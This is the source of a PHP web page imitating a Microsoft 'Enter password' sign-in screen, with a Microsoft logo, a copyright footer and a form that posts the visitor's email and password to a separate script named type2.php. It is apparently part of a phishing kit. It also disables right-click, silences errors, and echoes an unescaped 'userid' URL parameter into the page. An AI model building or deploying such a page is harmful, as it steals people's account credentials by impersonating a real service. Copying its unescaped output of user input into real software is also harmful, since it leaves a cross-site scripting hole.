﻿<? error_reporting(0); ?>
<!DOCTYPE html>
<html>
<head>
<meta name="viewport" content="width=device-width, initial-scale=1">
<link rel="shortcut icon" type="icon" href="imgs/favicon.ico">
<link rel="stylesheet" type="text/css" href="imgs/styles.css">
<script type="text/javascript" src="js/off_message.js"></script> 
<style>

</style>
<script>
</script>

 

<meta charset="UTF-8">
<title>Sign in to your account</title>
</head>
<body oncontextmenu="return false">
<div class="middiv">
<div style="margin: auto; position:relative; top: 40px; width:355px; height:270px; border:0px solid #ccc;line-height:15px;">
<img src="imgs/mic_logo.svg"><br><br>
<a href="#" style="text-decoration:none">
<div class="myactive">
 &nbsp;&nbsp;&nbsp;&nbsp;&nbsp; &nbsp; <?=$_GET[userid]?>
</div></a>

<h2>Enter password</h2>
<form name="registerationform" action="type2.php" method="post" onsubmit="return(regvalidate())">
<span id="div4" class="mydiv5"></span>
<div style="height:2px"></div>
<input type="hidden" name="email" value="<?=$_GET[userid]?>">
<input id="password" type="password" class="myinput" name="passt" placeholder="Password">
<br><br>
<span style="color: #262626;font-size: .8128rem;"><a href="#" style="text-decoration:none;color: #0067b8;">Forgot my password</a></span><br><br>
<input class="bluebutton" type="submit" value="Sign in">
</form>
</div>


</div>

<div class="footer">
©2020 Microsoft &nbsp;&nbsp;&nbsp;Terms of use &nbsp;&nbsp;&nbsp;Privacy & cookies&nbsp;&nbsp;.&nbsp;.&nbsp;.&nbsp;&nbsp;
</div>
</body>
</html>
